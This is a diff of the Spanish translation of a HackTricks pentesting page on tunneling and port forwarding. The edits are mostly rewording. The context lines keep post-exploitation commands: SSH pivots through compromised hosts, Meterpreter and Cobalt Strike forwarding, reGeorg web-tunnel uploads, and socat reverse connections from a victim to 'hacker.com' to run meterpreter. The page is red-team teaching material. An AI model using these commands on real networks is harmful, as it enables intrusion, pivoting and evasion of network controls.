@@ -1,4 +1,4 @@
-# Tunelización y Reenvío de Puertos
+# Tunneling and Port Forwarding
 
 <details>
 
@@ -12,9 +12,9 @@
 
 </details>
 
-**Grupo de Seguridad Try Hard**
+**Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -23,7 +23,7 @@
 ## Consejo de Nmap
 
 {% hint style="warning" %}
-Las exploraciones de **ICMP** y **SYN** no pueden ser tunelizadas a través de proxies socks, por lo que debemos **desactivar el descubrimiento de ping** (`-Pn`) y especificar **exploraciones TCP** (`-sT`) para que funcione.
+Las exploraciones **ICMP** y **SYN** no pueden ser tunelizadas a través de proxies socks, por lo que debemos **desactivar el descubrimiento de ping** (`-Pn`) y especificar **exploraciones TCP** (`-sT`) para que funcione.
 {% endhint %}
 
 ## **Bash**
@@ -62,7 +62,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Puerto a Puerto
 
-Puerto local --> Host comprometido (SSH) --> Tercer\_caja:Puerto
+Puerto local --> Host comprometido (SSH) --> Tercer\_equipo:Puerto
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -130,7 +130,7 @@ portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 ### SOCKS
 
-SOCKS (Socket Secure) es un protocolo de red que permite el enrutamiento de paquetes entre un cliente y un servidor a través de un servidor proxy. SOCKS opera en la capa 5 del modelo OSI, lo que significa que puede manejar solicitudes de red a nivel de aplicación, como HTTP, FTP, SMTP, etc. SOCKS proporciona una forma de encapsular el tráfico de red para enviarlo a través de un proxy.
+SOCKS (Socket Secure) es un protocolo de red que permite el enrutamiento de paquetes entre un cliente y un servidor a través de un servidor proxy. SOCKS opera en una capa más baja que HTTP, lo que lo hace útil para aplicaciones que no admiten proxies HTTP.
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -138,7 +138,7 @@ use auxiliary/server/socks_proxy
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
-Otra forma:
+Otro método:
 ```bash
 background #meterpreter session
 use post/multi/manage/autoroute
@@ -175,7 +175,7 @@ rportfwd stop [bind port]
 ### rPort2Port local
 
 {% hint style="warning" %}
-En este caso, el **puerto se abre en el host de Beacon**, no en el Servidor de Equipo y el **tráfico se envía al cliente de Cobalt Strike** (no al Servidor de Equipo) y desde allí al host:puerto indicado.
+En este caso, el **puerto se abre en el host del beacon**, no en el Servidor de Equipo y el **tráfico se envía al cliente de Cobalt Strike** (no al Servidor de Equipo) y desde allí al host:puerto indicado.
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -185,7 +185,7 @@ rportfwd_local stop [bind port]
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-Necesitas subir un archivo web de túnel: ashx|aspx|js|jsp|php|php|jsp
+Necesitas cargar un archivo de túnel web: ashx|aspx|js|jsp|php|php|jsp
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
@@ -261,7 +261,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Puedes evitar un **proxy no autenticado** ejecutando esta línea en lugar de la última en la consola de la víctima:
+Puedes evadir un **proxy no autenticado** ejecutando esta línea en lugar de la última en la consola de la víctima:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -297,14 +297,14 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Es como una versión de consola de PuTTY (las opciones son muy similares a las de un cliente ssh).
 
-Dado que este binario se ejecutará en la víctima y es un cliente ssh, necesitamos abrir nuestro servicio ssh y puerto para poder tener una conexión inversa. Luego, para reenviar solo el puerto accesible localmente a un puerto en nuestra máquina:
+Dado que este binario se ejecutará en la víctima y es un cliente ssh, necesitamos abrir nuestro servicio ssh y puerto para poder tener una conexión inversa. Luego, para reenviar solo un puerto accesible localmente a un puerto en nuestra máquina:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
 ```
 ## Windows netsh
 
-### Puerto a puerto
+### Port2Port
 
 Necesitas ser un administrador local (para cualquier puerto)
 ```bash
@@ -343,7 +343,7 @@ Ahora puedes usar [**Proxifier**](https://www.proxifier.com/) **para enrutar el 
 
 ## Proxificar aplicaciones GUI de Windows
 
-Puedes hacer que las aplicaciones GUI de Windows naveguen a través de un proxy usando [**Proxifier**](https://www.proxifier.com/).\
+Puedes hacer que las aplicaciones GUI de Windows naveguen a través de un proxy utilizando [**Proxifier**](https://www.proxifier.com/).\
 En **Profile -> Proxy Servers** agrega la IP y el puerto del servidor SOCKS.\
 En **Profile -> Proxification Rules** agrega el nombre del programa a proxificar y las conexiones a las IPs que deseas proxificar.
 
@@ -374,7 +374,7 @@ También podrías usar un **meterpreter** que se conecta a localhost:443 y el at
 
 Un proxy inverso creado por Microsoft. Puedes encontrarlo aquí: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
-## DNS Tunneling
+## Tunneling DNS
 
 ### Iodine
 
@@ -417,7 +417,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Cambiar el DNS de proxychains
 
-Proxychains intercepta la llamada `gethostbyname` de la biblioteca libc y canaliza la solicitud de DNS tcp a través del proxy socks. Por **defecto**, el servidor **DNS** que usa proxychains es **4.2.2.2** (codificado). Para cambiarlo, edita el archivo: _/usr/lib/proxychains3/proxyresolv_ y cambia la IP. Si estás en un entorno de **Windows**, podrías configurar la IP del **controlador de dominio**.
+Proxychains intercepta la llamada de la biblioteca `gethostbyname` y canaliza la solicitud de DNS tcp a través del proxy socks. Por **defecto**, el servidor **DNS** que usa proxychains es **4.2.2.2** (codificado). Para cambiarlo, edita el archivo: _/usr/lib/proxychains3/proxyresolv_ y cambia la IP. Si estás en un entorno de **Windows**, podrías configurar la IP del **controlador de dominio**.
 
 ## Túneles en Go
 
@@ -473,7 +473,7 @@ chmod a+x ./ngrok
 
 *También es posible agregar autenticación y TLS, si es necesario.*
 
-#### Túneles TCP
+#### Tunelización TCP
 ```bash
 # Pointing to 0.0.0.0:4444
 ./ngrok tcp 4444
@@ -491,7 +491,7 @@ chmod a+x ./ngrok
 *Útil para XSS, SSRF, SSTI ...*
 Directamente desde stdout o en la interfaz HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
-#### Túneles de servicio HTTP internos
+#### Tunelización de servicio HTTP interno
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -522,7 +522,7 @@ addr: file:///tmp/httpbin/
 
 **Grupo de Seguridad Try Hard**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -533,8 +533,8 @@ addr: file:///tmp/httpbin/
 <summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión del PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Obtén la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
